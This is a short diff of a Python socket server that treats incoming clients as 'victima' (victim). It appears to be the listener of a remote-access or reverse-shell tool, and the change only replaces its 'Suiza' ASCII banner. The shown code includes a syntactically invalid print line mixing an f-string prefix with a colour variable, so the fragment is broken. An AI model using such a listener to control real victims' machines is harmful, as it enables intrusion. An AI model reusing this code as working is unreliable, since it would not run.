@@ -11,9 +11,9 @@ server.listen(1)
 while True:
     victima,direccion=server.accept()
     print("""
-╔══════════════╗
-║     Suiza    ║
-╚══════════════╝
+    
+                    suiza                    
+                    
 """)
     print(f{Fore_MAGENTA}'[*] New Connection: {}'.format(direccion))
     msjBinario=victima.recv(1024)
